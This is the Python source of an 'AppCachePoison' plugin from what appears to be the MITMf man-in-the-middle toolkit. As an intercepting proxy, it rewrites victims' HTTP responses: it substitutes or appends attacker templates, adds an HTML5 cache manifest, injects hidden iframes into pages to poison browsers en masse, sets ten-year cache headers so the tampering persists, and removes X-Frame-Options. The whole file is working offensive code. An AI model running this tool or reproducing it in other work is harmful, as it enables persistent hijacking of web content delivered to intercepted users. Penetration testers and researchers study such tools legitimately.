#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Krzysztof Kotowicz, Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import re 
import os.path
import time
import sys

from datetime import date
from plugins.plugin import Plugin
from core.sslstrip.URLMonitor import URLMonitor

mitmf_logger = logging.getLogger("mitmf")

class AppCachePlugin(Plugin):
    name       = "AppCachePoison"
    optname    = "appoison"
    desc       = "Performs App Cache Poisoning attacks"
    version    = "0.3"
    has_opts   = False

    def initialize(self, options):
        self.options = options
        self.mass_poisoned_browsers = []
        self.urlMonitor = URLMonitor.getInstance()

        self.urlMonitor.setAppCachePoisoning()

    def serverResponse(self, response, request, data):

        #This code was literally copied + pasted from Koto's sslstrip fork, def need to clean this up in the near future

        self.app_config = self.config['AppCachePoison'] # so we reload the config on each request
        url = request.client.uri
        req_headers = request.client.getAllHeaders()
        headers = request.client.responseHeaders
        ip = request.client.getClientIP()

        #########################################################################

        if "enable_only_in_useragents" in self.app_config:
            regexp = self.app_config["enable_only_in_useragents"]
            if regexp and not re.search(regexp,req_headers["user-agent"]):
                mitmf_logger.info("{} [{}] Tampering disabled in this useragent ({})".format(ip, self.name, req_headers["user-agent"]))
                return {'response': response, 'request': request, 'data': data}
               
        urls = self.urlMonitor.getRedirectionSet(url)
        mitmf_logger.debug("{} [{}] Got redirection set: {}".format(ip,self.name, urls))
        (name,s,element,url) = self.getSectionForUrls(urls)

        if s is False:
          data = self.tryMassPoison(url, data, headers, req_headers, ip)
          return {'response': response, 'request': request, 'data': data}

        mitmf_logger.info("{} [{}] Found URL {} in section {}".format(ip, self.name, url, name))
        p = self.getTemplatePrefix(s)

        if element == 'tamper':
          mitmf_logger.info("{} [{}] Poisoning tamper URL with template {}".format(ip, self.name, p))
          if os.path.exists(p + '.replace'): # replace whole content
            f = open(p + '.replace','r')
            data = self.decorate(f.read(), s)
            f.close()

          elif os.path.exists(p + '.append'): # append file to body
            f = open(p + '.append','r')
            appendix = self.decorate(f.read(), s)
            f.close()
            # append to body
            data = re.sub(re.compile("</body>",re.IGNORECASE),appendix + "</body>", data)

          # add manifest reference
          data = re.sub(re.compile("<html",re.IGNORECASE),"<html manifest=\"" + self.getManifestUrl(s)+"\"", data)
          
        elif element == "manifest":
          mitmf_logger.info("{} [{}] Poisoning manifest URL".format(ip, self.name))
          data = self.getSpoofedManifest(url, s)
          headers.setRawHeaders("Content-Type", ["text/cache-manifest"])

        elif element == "raw": # raw resource to modify, it does not have to be html
          mitmf_logger.info("{} [{}] Poisoning raw URL".format(ip, self.name))
          if os.path.exists(p + '.replace'): # replace whole content
            f = open(p + '.replace','r')
            data = self.decorate(f.read(), s)
            f.close()

          elif os.path.exists(p + '.append'): # append file to body
            f = open(p + '.append','r')
            appendix = self.decorate(f.read(), s)
            f.close()
            # append to response body
            data += appendix
        
        self.cacheForFuture(headers)
        self.removeDangerousHeaders(headers)
        return {'response': response, 'request': request, 'data': data}

    def tryMassPoison(self, url, data, headers, req_headers, ip):
        browser_id = ip + req_headers.get("user-agent", "")

        if not 'mass_poison_url_match' in self.app_config: # no url
            return data
        if browser_id in self.mass_poisoned_browsers: #already poisoned
            return data
        if not headers.hasHeader('content-type') or not re.search('html(;|$)', headers.getRawHeaders('content-type')[0]): #not HTML
            return data
        if 'mass_poison_useragent_match' in self.app_config and not "user-agent" in req_headers:
            return data
        if not re.search(self.app_config['mass_poison_useragent_match'], req_headers['user-agent']): #different UA
            return data
        if not re.search(self.app_config['mass_poison_url_match'], url): #different url
            return data
        
        mitmf_logger.debug("[{}] Adding AppCache mass poison for URL {}, id {}".format(self.name, url, browser_id))
        appendix = self.getMassPoisonHtml()
        data = re.sub(re.compile("</body>",re.IGNORECASE),appendix + "</body>", data)
        self.mass_poisoned_browsers.append(browser_id) # mark to avoid mass spoofing for this ip
        return data

    def getMassPoisonHtml(self):
        html = "<div style=\"position:absolute;left:-100px\">"
        for i in self.app_config:
            if isinstance(self.app_config[i], dict):
                if self.app_config[i].has_key('tamper_url') and not self.app_config[i].get('skip_in_mass_poison', False):
                    html += "<iframe sandbox=\"\" style=\"opacity:0;visibility:hidden\" width=\"1\" height=\"1\" src=\"" + self.app_config[i]['tamper_url'] + "\"></iframe>" 

        return html + "</div>"
        
    def cacheForFuture(self, headers):
        ten_years = 315569260
        headers.setRawHeaders("Cache-Control",["max-age="+str(ten_years)])
        headers.setRawHeaders("Last-Modified",["Mon, 29 Jun 1998 02:28:12 GMT"]) # it was modifed long ago, so is most likely fresh
        in_ten_years = date.fromtimestamp(time.time() + ten_years)
        headers.setRawHeaders("Expires",[in_ten_years.strftime("%a, %d %b %Y %H:%M:%S GMT")])

    def removeDangerousHeaders(self, headers):
        headers.removeHeader("X-Frame-Options")

    def getSpoofedManifest(self, url, section):
        p = self.getTemplatePrefix(section)
        if not os.path.exists(p+'.manifest'):
          p = self.getDefaultTemplatePrefix()

        f = open(p + '.manifest', 'r')
        manifest = f.read()
        f.close()
        return self.decorate(manifest, section)

    def decorate(self, content, section):
        for i in section:
          content = content.replace("%%"+i+"%%", section[i])
        return content

    def getTemplatePrefix(self, section):
        if section.has_key('templates'):
            return self.app_config['templates_path'] + '/' + section['templates']
        
        return self.getDefaultTemplatePrefix()

    def getDefaultTemplatePrefix(self):
        return self.app_config['templates_path'] + '/default'

    def getManifestUrl(self, section):
      return section.get("manifest_url",'/robots.txt')

    def getSectionForUrls(self, urls):
        for url in urls:
            for i in self.app_config:
              if isinstance(self.app_config[i], dict): #section
                section = self.app_config[i]
                name = i
                
                if section.get('tamper_url',False) == url:
                  return (name, section, 'tamper',url)
                
                if section.has_key('tamper_url_match') and re.search(section['tamper_url_match'], url):
                  return (name, section, 'tamper',url)
                
                if section.get('manifest_url',False) == url:
                  return (name, section, 'manifest',url)

                if section.get('raw_url',False) == url:
                  return (name, section, 'raw',url)

        return (None, False,'',urls.copy().pop())
